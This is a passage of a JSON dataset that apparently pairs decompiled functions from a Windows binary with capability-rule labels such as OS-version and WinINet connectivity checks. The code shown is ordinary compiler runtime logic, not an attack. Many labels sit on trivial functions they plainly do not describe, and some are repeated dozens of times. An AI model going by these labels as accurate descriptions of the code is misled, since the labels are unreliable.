            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.14009fb20(int32_t **arg1)\n\n{\n    int32_t iVar1;\n    int32_t *arg1_00;\n    \n    arg1_00 = *arg1;\n    if (arg1_00 != *0x1400fb720) {\n        if (**0x140102a70 == 0) {\n            iVar1 = *arg1_00;\n            *arg1_00 = iVar1 + -1;\n        }\n        else {\n            LOCK();\n            iVar1 = *arg1_00;\n            *arg1_00 = *arg1_00 + -1;\n        }\n        if (iVar1 == 1) {\n            fcn.14009f4c0(arg1_00);\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)(arg1_00);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 223
    },
    "14001bbb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_fh\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.14001bbb0(int64_t arg1, int64_t arg2)\n\n{\n    char cVar1;\n    code *pcVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    ulong uVar7;\n    int64_t *piVar8;\n    code *pcVar9;\n    char *pcVar10;\n    ulong unaff_RDI;\n    ulong uVar11;\n    ulong uVar12;\n    ulong uVar13;\n    ulong auStack280 [6];\n    int32_t iStack228;\n    int64_t iStack224;\n    code *apcStack216 [6];\n    ulong auStack168 [6];\n    ulong var_70h;\n    ulong var_68h;\n    ulong var_60h;\n    ulong var_58h;\n    ulong var_50h;\n    ulong var_48h;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_fh;\n    \n    uVar11 = 0x756f6e6520746f6e;\n    uVar12 = 0x6563617073206867;\n    uVar13 = 0x726f6620726f6620;\n    var_68h = 0x657220677562206c;\n    pcVar9 = arg2 - arg1;\n    var_70h = 0x6c75662074696d62;\n    var_58h = 0x2f2f3a7370747468;\n    var_48h._0_1_ = 0x6f;\n    var_60h = 0x2074612074726f70;\n    var_50h = 0x2e756e672e636367;\n    var_40h._1_7_ = 0x202020200a3a29;\n    var_38h._0_1_ = 0;\n    auStack168[0] = 0x756f6e6520746f6e;\n    auStack168[1] = 0x6563617073206867;\n    auStack168[2] = 0x726f6620726f6620;\n    auStack168[3] = 0x617078652074616d;\n    auStack168[4] = 0x5028206e6f69736e;\n    auStack168[5] = 0x757320657361656c;\n    var_48h._1_7_ = 0x736775622f6772;\n    var_40h._0_1_ = 0x2f;\n    apcStack216[1] = 0x14001bc9f;\n    iVar4 = fcn.14000e880(arg1);\n    uVar3 = var_50h;\n    uVar6 = CONCAT71(var_48h._1_7_, var_48h);\n    iVar4 = -iVar4;\n    *(&fcn.14001bbb0::var_70h + iVar4) = 0x6c75662074696d62;\n    *(&fcn.14001bbb0::var_60h + iVar4) = 0x2074612074726f70;\n    uVar7 = CONCAT71(var_40h._1_7_, var_40h);\n    *(&fcn.14001bbb0::var_68h + iVar4) = 0x657220677562206c;\n    *(&fcn.14001bbb0::var_40h + iVar4) = uVar7;\n    *(&fcn.14001bbb0::var_58h + iVar4) = 0x2f2f3a7370747468;\n    *(&stack0xffffffffffffff58 + iVar4) = uVar11;\n    *(&stack0xffffffffffffff60 + iVar4) = uVar12;\n    *(&stack0xffffffffffffff68 + iVar4) = uVar13;\n    *(&stack0xffffffffffffff70 + iVar4) = 0x617078652074616d;\n    *(&stack0xffffffffffffff78 + iVar4) = 0x5028206e6f69736e;\n    *(&stack0xffffffffffffff80 + iVar4) = 0x757320657361656c;\n    *(&fcn.14001bbb0::var_50h + iVar4) = uVar3;\n    *(&fcn.14001bbb0::var_48h + iVar4) = uVar6;\n    *(&stack0xffffffffffffff30 + iVar4) = 0x14001bd2d;\n    sub.msvcrt.dll_memcpy(uVar3, &fcn.14001bbb0::var_38h + iVar4);\n    pcVar9[&fcn.14001bbb0::var_38h + iVar4] = 0x0;\n    *(&stack0xffffffffffffff30 + iVar4) = 0x14001bd3d;\n    fcn.1400b7080(&stack0xffffffffffffff58 + iVar4);\n    *(&stack0xffffffffffffff30 + iVar4) = unaff_RDI;\n    *(&stack0xffffffffffffff28 + iVar4) = pcVar9;\n    *(&stack0xffffffffffffff20 + iVar4) = &stack0xffffffffffffff58 + iVar4;\n    if (*0x1400fc350 != '\\0') goto code_r0x00014001be46;\n    *0x1400fc350 = '\\x01';\n    *(&stack0xfffffffffffffee8 + iVar4) = 0x14001bd60;\n    iVar5 = fcn.1400b6820();\n    if (iVar5 != 0) {\n        pcVar10 = *(iVar5 + 8);\n        cVar1 = *pcVar10;\n        *(&stack0xffffffffffffff1c + iVar4) = 0xffffffff;\n        pcVar10 = pcVar10 + (cVar1 == '*');\n        *(&stack0xfffffffffffffee8 + iVar4) = 0x14001bd92;\n        uVar6 = fcn.14000d690(pcVar10, 0, 0, &stack0xffffffffffffff1c + iVar4);\n        pcVar9 = *0x1400f9540;\n        *(&stack0xfffffffffffffee8 + iVar4) = 0x14001bda3;\n        uVar7 = (**0x1400f9540)(2);\n        *(&stack0xfffffffffffffee8 + iVar4) = 0x14001bdbd;\n        sub.msvcrt.dll_fwrite(\"terminate called after throwing an instance of \\'\", 1, 0x30, uVar7);\n        if (*(&stack0xffffffffffffff1c + iVar4) == 0) goto code_r0x00014001be0d;\n        *(&stack0xfffffffffffffee8 + iVar4) = 0x14001bdcc;\n        uVar7 = (*pcVar9)(2);\n        *(&stack0xfffffffffffffee8 + iVar4) = 0x14001bdd7;\n        sub.msvcrt.dll_fputs(pcVar10, uVar7);\n        do {\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x14001bdde;\n            uVar7 = (*pcVar9)(2);\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x14001bdf8;\n            sub.msvcrt.dll_fwrite(0x1400fd471, 1, 2, uVar7);\n            if (*(&stack0xffffffffffffff1c + iVar4) == 0) {\n                *(&stack0xfffffffffffffee8 + iVar4) = 0x14001be08;\n                fcn.1400185e0(uVar6);\n            }\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x14001be0d;\n            fcn.1400b6b70();\ncode_r0x00014001be0d:\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x14001be0f;\n            uVar7 = (*pcVar9)();\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x14001be1a;\n            sub.msvcrt.dll_fputs(uVar6, uVar7);\n        } while( true );\n    }\n    *(&stack0xfffffffffffffee8 + iVar4) = 0x14001be27;\n    uVar6 = (**0x1400f9540)(2);\n    *(&stack0xfffffffffffffee8 + iVar4) = 0x14001be41;\n    sub.msvcrt.dll_fwrite(\"terminate called without an active exception\\n\", 1, 0x2d, uVar6);\n    do {\n        while( true ) {\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x14001be46;\n            sub.msvcrt.dll_abort();\ncode_r0x00014001be46:\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x14001be51;\n            uVar6 = (**0x1400f9540)(2);\n            iVar5 = 1;\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x14001be6b;\n            sub.msvcrt.dll_fwrite(\"terminate called recursively\\n\", 1, 0x1d, uVar6);\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x14001be70;\n            uVar6 = sub.msvcrt.dll_abort();\n            if (iVar5 != 1) break;\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x14001be7e;\n            piVar8 = fcn.1400b6670(uVar6);\n            pcVar2 = *(*piVar8 + 0x10);\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x14001be87;\n            uVar6 = (*pcVar2)(piVar8);\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x14001be91;\n            uVar7 = (*pcVar9)(2);\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x14001beab;\n            sub.msvcrt.dll_fwrite(\"  what():  \", 1, 0xb, uVar7);\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x14001beb2;\n            uVar7 = (*pcVar9)(2);\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x14001bebd;\n            sub.msvcrt.dll_fputs(uVar6, uVar7);\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x14001bec4;\n            uVar6 = (*pcVar9)(2);\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x14001bed1;\n            sub.msvcrt.dll_fputc(10, uVar6);\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x14001bed6;\n            fcn.1400b6850();\n        }\n        *(&stack0xfffffffffffffee8 + iVar4) = 0x14001bee0;\n        fcn.1400b6670(uVar6);\n        *(&stack0xfffffffffffffee8 + iVar4) = 0x14001bee5;\n        fcn.1400b6850();\n    } while( true );\n}\n",
        "token_count": 2629
    },
    "14001df5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.14001df50(int64_t *arg1, ushort *arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    ushort *puVar1;\n    uint64_t arg4_00;\n    uint64_t *puVar2;\n    uint64_t uVar3;\n    \n    arg4_00 = *(*arg1 + -0x18);\n    if (arg4_00 < arg4) {\n        puVar2 = 0x1400fd950;\n        fcn.1400b1a60(0x1400fd950, 0x1400fd9cc, arg4, arg4_00);\n        return *puVar2;\n    }\n    uVar3 = arg4_00 - arg4;\n    if (arg3 < arg4_00 - arg4) {\n        uVar3 = arg3;\n    }\n    if (uVar3 != 0) {\n        puVar1 = *arg1 + arg4 * 2;\n        if (uVar3 == 1) {\n            *arg2 = *puVar1;\n            return 1;\n        }\n        sub.msvcrt.dll_memcpy(arg2, puVar1, uVar3 * 2);\n    }\n    return uVar3;\n}\n",
        "token_count": 276
    },
    "14001efe": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.14001efe0(int64_t *arg1, uchar *arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    uint64_t arg4_00;\n    uint64_t *puVar1;\n    uchar *puVar2;\n    uint64_t uVar3;\n    \n    arg4_00 = *(*arg1 + -0x18);\n    if (arg4_00 < arg4) {\n        puVar1 = 0x1400fd790;\n        fcn.1400b1a60(0x1400fd790, 0x1400fd80c, arg4, arg4_00);\n        return *puVar1;\n    }\n    uVar3 = arg4_00 - arg4;\n    if (arg3 < arg4_00 - arg4) {\n        uVar3 = arg3;\n    }\n    if (uVar3 != 0) {\n        puVar2 = *arg1 + arg4;\n        if (uVar3 == 1) {\n            *arg2 = *puVar2;\n            return 1;\n        }\n        sub.msvcrt.dll_memcpy(arg2, puVar2, uVar3);\n    }\n    return uVar3;\n}\n",
        "token_count": 270
    },
    "1400211d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool fcn.1400211d0(int64_t *arg1)\n\n{\n    return *arg1 != 0;\n}\n",
        "token_count": 28
    },
    "14002540": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.140025400(int64_t *arg1)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int16_t iVar3;\n    int16_t iVar4;\n    int16_t iVar5;\n    int16_t iVar6;\n    int16_t iVar7;\n    int16_t iVar8;\n    int16_t iVar9;\n    int16_t iVar10;\n    int16_t iVar11;\n    int16_t iVar12;\n    int16_t iVar13;\n    int16_t iVar14;\n    int16_t iVar15;\n    int16_t iVar16;\n    uint64_t uVar17;\n    int64_t iVar18;\n    uint64_t uVar19;\n    uint32_t uVar20;\n    uint64_t uVar21;\n    uint16_t uVar22;\n    int32_t iVar23;\n    uint *puVar24;\n    uint *puVar25;\n    ulong uVar26;\n    uchar auVar28 [16];\n    ushort uVar30;\n    uint16_t uVar31;\n    uchar auVar29 [16];\n    int64_t iVar32;\n    int64_t iVar33;\n    ushort uVar34;\n    uint uStack408;\n    uint uStack404;\n    uint uStack400;\n    uint uStack396;\n    uint uStack392;\n    uint uStack388;\n    uint uStack384;\n    uint uStack380;\n    uint uStack376;\n    uint uStack372;\n    uint uStack368;\n    uint uStack364;\n    uint uStack360;\n    uint uStack356;\n    uint uStack352;\n    uint uStack348;\n    uint uStack344;\n    uint uStack340;\n    uint uStack336;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint auStack152 [32];\n    uchar auVar27 [12];\n    \n    puVar24 = &uStack408;\n    auVar28 = *0x1400fdb20;\n    do {\n        puVar25 = puVar24 + 4;\n        iVar32 = SUB168(auVar28, 0);\n        iVar33 = SUB168(auVar28 >> 0x40, 0);\n        uVar20 = SUB164(auVar28, 0);\n        iVar23 = uVar20 + *0x1400fdb40;\n        uVar22 = SUB162(auVar28 >> 0x40, 0);\n        uVar26 = CONCAT44(SUB164(auVar28 >> 0x40, 0), uVar20);\n        auVar27 = CONCAT48(iVar23, uVar26);\n        uVar17 = iVar32 + *0x1400fdb50 & 0xffffffff;\n        uVar30 = iVar33 + *0x1400fdb58;\n        auVar29 = CONCAT88(SUB168(CONCAT610(SUB166(CONCAT412(SUB164(CONCAT214((iVar33 + *0x1400fdb58 << 0x20) >> 0x30, \n                                                                              CONCAT212(SUB162(auVar28 >> 0x50, 0), \n                                                                                        auVar27)) >> 0x60, 0), \n                                                             CONCAT210(uVar30, SUB1210(auVar27, 0))) >> 0x50, 0), \n                                            CONCAT28(uVar22, uVar26)) >> 0x40, 0), (uVar17 >> 0x10) << 0x30) &\n                  0xffff000000000000;\n        uVar34 = iVar23 >> 0x10;\n        uVar19 = CONCAT24(uVar34, (uVar20 + *0x1400fdb60) * 0x10000) & 0xffff0000;\n        auVar28 = CONCAT124(SUB1612(CONCAT88(SUB168(CONCAT610(SUB166(CONCAT412(SUB164(CONCAT214(uVar20 + *0x1400fdb60 >>\n                                                                                                0x10, CONCAT212(uVar17 \n                                                            >> 0x10, SUB1612(auVar29, 0))) >> 0x60, 0), \n                                                            CONCAT210(uVar34, SUB1610(auVar29, 0))) >> 0x50, 0), \n                                                            CONCAT28(SUB162(auVar28 >> 0x10, 0), SUB168(auVar29, 0))) >>\n                                                    0x40, 0), (uVar19 >> 0x10) << 0x30) >> 0x20, 0) &\n                            SUB1612(0xffff000000000000 >> 0x20, 0), iVar23 * 0x10000);\n        iVar23 = uVar20 + *0x1400fdb80;\n        auVar28 = CONCAT124(SUB1612(CONCAT106(SUB1610(CONCAT88(SUB168(CONCAT610(SUB166(CONCAT412(SUB164(CONCAT214(uVar22\n                                                                                                                  + *\n                                                            0x1400fdb68, CONCAT212(uVar19 >> 0x10, SUB1612(auVar28, 0)))\n                                                            >> 0x60, 0), CONCAT210(uVar30, SUB1610(auVar28, 0))) >> 0x50\n                                                            , 0), CONCAT28(uVar17, SUB168(auVar28, 0))) >> 0x40, 0), \n                                                            ((CONCAT24(uVar30, CONCAT22(uVar22 + *0x1400fdb48, uVar22))\n                                                             & 0xffff0000) >> 0x10) << 0x30) >> 0x30, 0), \n                                              (SUB166(auVar28, 0) >> 0x10) << 0x20) >> 0x20, 0), \n                            uVar20 & 0xffff | uVar22 << 0x10) & *0x1400fdbb0;\n        uVar17 = iVar32 + *0x1400fdb70 & 0xffffffff;\n        iVar18 = iVar33 + *0x1400fdb78 << 0x20;\n        uVar19 = iVar32 + *0x1400fdb90 & 0xffffffff;\n        uVar34 = iVar33 + *0x1400fdb98;\n        uVar31 = iVar33 + *0x1400fdb78;\n        auVar29 = CONCAT88(SUB168(CONCAT610(SUB166(CONCAT412(SUB164(CONCAT214((iVar33 + *0x1400fdb98 << 0x20) >> 0x30, \n                                                                              CONCAT212(iVar18 >> 0x30, \n                                                                                        CONCAT48(iVar23, iVar18))) >>\n                                                                    0x60, 0), \n                                                             CONCAT210(uVar34, SUB1210(CONCAT48(iVar23, iVar18), 0))) >>\n                                                   0x50, 0), CONCAT28(uVar31, iVar18)) >> 0x40, 0), \n                           (uVar19 >> 0x10) << 0x30) & 0xffff000000000000;\n        uVar30 = iVar23 >> 0x10;\n        uVar21 = CONCAT24(uVar30, (uVar20 + *0x1400fdba0) * 0x10000) & 0xffff0000;\n        auVar29 = CONCAT124(SUB1612(CONCAT88(SUB168(CONCAT610(SUB166(CONCAT412(SUB164(CONCAT214(uVar20 + *0x1400fdba0 >>\n                                                                                                0x10, CONCAT212(uVar19 \n                                                            >> 0x10, SUB1612(auVar29, 0))) >> 0x60, 0), \n                                                            CONCAT210(uVar30, SUB1610(auVar29, 0))) >> 0x50, 0), \n                                                            CONCAT28(uVar17 >> 0x10, SUB168(auVar29, 0))) >> 0x40, 0), \n                                             (uVar21 >> 0x10) << 0x30) >> 0x20, 0) &\n                            SUB1612(0xffff000000000000 >> 0x20, 0), iVar23 * 0x10000);\n        auVar29 = CONCAT124(SUB1612(CONCAT106(SUB1610(CONCAT88(SUB168(CONCAT610(SUB166(CONCAT412(SUB164(CONCAT214(uVar22\n                                                                                                                  + *\n                                                            0x1400fdba8, CONCAT212(uVar21 >> 0x10, SUB1612(auVar29, 0)))\n                                                            >> 0x60, 0), CONCAT210(uVar34, SUB1610(auVar29, 0))) >> 0x50\n                                                            , 0), CONCAT28(uVar19, SUB168(auVar29, 0))) >> 0x40, 0), \n                                                            ((CONCAT24(uVar34, CONCAT22(uVar22 + *0x1400fdb88, uVar31))\n                                                             & 0xffff0000) >> 0x10) << 0x30) >> 0x30, 0), \n                                              (SUB166(auVar29, 0) >> 0x10) << 0x20) >> 0x20, 0), \n                            uVar17 & 0xffff | uVar31 << 0x10) & *0x1400fdbb0;\n        iVar1 = SUB162(auVar28, 0);\n        iVar2 = SUB162(auVar28 >> 0x10, 0);\n        iVar3 = SUB162(auVar28 >> 0x20, 0);\n        iVar4 = SUB162(auVar28 >> 0x30, 0);\n        iVar5 = SUB162(auVar28 >> 0x40, 0);\n        iVar6 = SUB162(auVar28 >> 0x50, 0);\n        iVar7 = SUB162(auVar28 >> 0x60, 0);\n        iVar8 = SUB162(auVar28 >> 0x70, 0);\n        iVar9 = SUB162(auVar29, 0);\n        iVar10 = SUB162(auVar29 >> 0x10, 0);\n        iVar11 = SUB162(auVar29 >> 0x20, 0);\n        iVar12 = SUB162(auVar29 >> 0x30, 0);\n        iVar13 = SUB162(auVar29 >> 0x40, 0);\n        iVar14 = SUB162(auVar29 >> 0x50, 0);\n        iVar15 = SUB162(auVar29 >> 0x60, 0);\n        iVar16 = SUB162(auVar29 >> 0x70, 0);\n        *puVar24 = (0 < iVar1) * (iVar1 < 0xff) * SUB161(auVar28, 0) - (0xff < iVar1);\n        *(puVar24 + 1) = (0 < iVar2) * (iVar2 < 0xff) * SUB161(auVar28 >> 0x10, 0) - (0xff < iVar2);\n        *(puVar24 + 2) = (0 < iVar3) * (iVar3 < 0xff) * SUB161(auVar28 >> 0x20, 0) - (0xff < iVar3);\n        *(puVar24 + 3) = (0 < iVar4) * (iVar4 < 0xff) * SUB161(auVar28 >> 0x30, 0) - (0xff < iVar4);\n        *(puVar24 + 1) = (0 < iVar5) * (iVar5 < 0xff) * SUB161(auVar28 >> 0x40, 0) - (0xff < iVar5);\n        *(puVar24 + 5) = (0 < iVar6) * (iVar6 < 0xff) * SUB161(auVar28 >> 0x50, 0) - (0xff < iVar6);\n        *(puVar24 + 6) = (0 < iVar7) * (iVar7 < 0xff) * SUB161(auVar28 >> 0x60, 0) - (0xff < iVar7);\n        *(puVar24 + 7) = (0 < iVar8) * (iVar8 < 0xff) * SUB161(auVar28 >> 0x70, 0) - (0xff < iVar8);\n        *(puVar24 + 2) = (0 < iVar9) * (iVar9 < 0xff) * SUB161(auVar29, 0) - (0xff < iVar9);\n        *(puVar24 + 9) = (0 < iVar10) * (iVar10 < 0xff) * SUB161(auVar29 >> 0x10, 0) - (0xff < iVar10);\n        *(puVar24 + 10) = (0 < iVar11) * (iVar11 < 0xff) * SUB161(auVar29 >> 0x20, 0) - (0xff < iVar11);\n        *(puVar24 + 0xb) = (0 < iVar12) * (iVar12 < 0xff) * SUB161(auVar29 >> 0x30, 0) - (0xff < iVar12);\n        *(puVar24 + 3) = (0 < iVar13) * (iVar13 < 0xff) * SUB161(auVar29 >> 0x40, 0) - (0xff < iVar13);\n        *(puVar24 + 0xd) = (0 < iVar14) * (iVar14 < 0xff) * SUB161(auVar29 >> 0x50, 0) - (0xff < iVar14);\n        *(puVar24 + 0xe) = (0 < iVar15) * (iVar15 < 0xff) * SUB161(auVar29 >> 0x60, 0) - (0xff < iVar15);\n        *(puVar24 + 0xf) = (0 < iVar16) * (iVar16 < 0xff) * SUB161(auVar29 >> 0x70, 0) - (0xff < iVar16);\n        puVar24 = puVar25;\n        auVar28 = CONCAT88(iVar33 + *0x1400fdb38, iVar32 + *0x1400fdb30);\n    } while (auStack152 != puVar25);\n    if (*(*arg1 + 0x38) == 0x140025bc0) {\n        *(arg1 + 0x39) = uStack408;\n        *(arg1 + 0x3d) = uStack404;\n        *(arg1 + 0x41) = uStack400;\n        *(arg1 + 0x45) = uStack396;\n        *(arg1 + 0x49) = uStack392;\n        *(arg1 + 0x4d) = uStack388;\n        *(arg1 + 0x51) = uStack384;\n        *(arg1 + 0x55) = uStack380;\n        *(arg1 + 0x59) = uStack376;\n        *(arg1 + 0x5d) = uStack372;\n        *(arg1 + 0x61) = uStack368;\n        *(arg1 + 0x65) = uStack364;\n        *(arg1 + 0x69) = uStack360;\n        *(arg1 + 0x6d) = uStack356;\n        *(arg1 + 0x71) = uStack352;\n        *(arg1 + 0x75) = uStack348;\n        *(arg1 + 0x79) = uStack344;\n        *(arg1 + 0x7d) = uStack340;\n        *(arg1 + 0x81) = uStack336;\n        *(arg1 + 0x85) = uStack332;\n        *(arg1 + 0x89) = uStack328;\n        *(arg1 + 0x8d) = uStack324;\n        *(arg1 + 0x91) = uStack320;\n        *(arg1 + 0x95) = uStack316;\n        *(arg1 + 0x99) = uStack312;\n        *(arg1 + 0x9d) = uStack308;\n        *(arg1 + 0xa1) = uStack304;\n        *(arg1 + 0xa5) = uStack300;\n        *(arg1 + 0xa9) = uStack296;\n        *(arg1 + 0xad) = uStack292;\n        *(arg1 + 0xb1) = uStack288;\n        *(arg1 + 0xb5) = uStack284;\n        *(arg1 + 0xb9) = uStack280;\n        *(arg1 + 0xbd) = uStack276;\n        